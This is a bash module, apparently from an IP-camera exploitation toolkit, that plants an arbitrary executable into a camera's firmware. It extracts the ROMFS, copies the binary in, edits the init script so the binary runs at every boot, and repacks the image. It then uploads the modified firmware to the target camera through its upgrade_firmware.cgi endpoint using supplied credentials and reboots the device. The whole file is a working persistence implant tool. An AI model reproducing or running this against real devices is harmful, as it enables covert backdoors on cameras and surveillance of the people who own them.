#!/bin/bash

# Add command to the array
export CMD_LIST=("${CMD_LIST[@]}" inject_exec)

validate_syspack()
{
    SYSPACK=$(which syspack)
    [[ -z $SYSPACK ]] && die "syspack not found in \$PATH"
}


validate_sysextract()
{
    SYSEXTRACT=$(which sysextract)
    [[ -z $SYSEXTRACT ]] && die "sysextract not found in \$PATH"
}

validate_genromfs()
{
    GENROMFS=$(which genromfs)
    [[ -z $GENROMFS ]] && die "genromfs not found in \$PATH"
}

validate_inject_exec()
{
    validate_admin
    validate_curl
    validate_genromfs
    validate_sysextract
    validate_syspack
    get_sys_version

    if [[ -z $EXEC ]] || [[ ! -f $EXEC ]]
    then
        die "Executable file must be provided (and must exist $EXEC) as an argument to inject_exec command."
    fi

    if [[ -z $SYS_FW_LIB ]] || [[ ! -d $SYS_FW_LIB ]]
    then
        die "System firmware library directory must be provided (and must exist $SYS_FW_LIB) as an argument to inject_exec command."
    fi
}

run_inject_exec()
{
    validate_inject_exec    

    # Locate sys firmware 
    SYS_FW_FILE=$SYS_FW_LIB/$SYSTEM_VERSION/lr_cmos_$SYSTEM_VERSION.bin
    [[ -f $SYS_FW_FILE ]] || die "$SYS_FW_FILE does not exist. Aborting run_inject_exec"
    green "Found matching system firmware in the library"

    # Verify integrity of sys firmware
    $SYSEXTRACT -c $SYS_FW_FILE
    [[ $? == 0 ]] || red "Could not verify integrity of $SYS_FS_FILE"
    green "Verified the integrity of system firmware "
    
    # Create temporary directory
    TMP_SYS_FW_DIR=/tmp/sys_fw$SUFFIX/
    mkdir -p $TMP_SYS_FW_DIR

    # Extract firmware 
    $SYSEXTRACT -x $SYS_FW_FILE -o $TMP_SYS_FW_DIR
    [[ $? == 0 ]] || die "Could not extract firmware from $SYS_FW_FILE"
    green "Successfully extracted system firmware"
    
    # Mount romfs and make a rw copy 
    mkdir -p $TMP_SYS_FW_DIR/rom $TMP_SYS_FW_DIR/rom-rw
    mount -o loop $TMP_SYS_FW_DIR/romfs.img $TMP_SYS_FW_DIR/rom >/dev/null 2>&1
    cp -R $TMP_SYS_FW_DIR/rom/* $TMP_SYS_FW_DIR/rom-rw
    umount $TMP_SYS_FW_DIR/rom
    green "Mounted the ROM-FS image"

    # Copy executable file over and add to init
    cp $EXEC $TMP_SYS_FW_DIR/rom-rw/bin
    EXEC_BASENAME=$(basename $EXEC)
    sed -i 's/camera\&/camera\&\n'$EXEC_BASENAME'\&/' $TMP_SYS_FW_DIR/rom-rw/bin/init
    green "Injected the binary $EXEC into the ROM-FS"

    # Genromfs
    mkdir -p $TMP_SYS_FW_DIR/new
    $GENROMFS -f $TMP_SYS_FW_DIR/new/romfs.img -d $TMP_SYS_FW_DIR/rom-rw
    [[ $? == 0 ]] || die "Could not generate ROMFS image"
    green "Generated new ROM-FS image"

    # Pack and verify integrity
    NEW_FW_FILE=$TMP_SYS_FW_DIR/new/lr_cmos_$SYSTEM_VERSION.bin
    $SYSPACK -k $TMP_SYS_FW_DIR/linux.bin -i $TMP_SYS_FW_DIR/new/romfs.img -o $NEW_FW_FILE 
    $SYSEXTRACT -c $NEW_FW_FILE
    [[ $? == 0 ]] || die "Could not verify integrity of $NEW_FW_FILE"
    echo
    green "Created new firmware image ($NEW_FW_FILE)"

    echo "Trying to upload system firmware to $ADDR"
    # Upload file to the camera
    CODE=$($CURL -s -o /dev/null -w "%{http_code}" \
        -F "file=@$NEW_FW_FILE;filename=$EXEC_BASENAME;type=application/binary" \
        $ADDR/upgrade_firmware.cgi'?next_url=reboot.htm&user='$USERNAME'&pwd='$PASSWORD
    )
        
    [[ $CODE == 200 ]] || die "Uploading firmware to $ADDR failed"
    green "Successfully uploaded firmware and rebooted $ADDR"
}

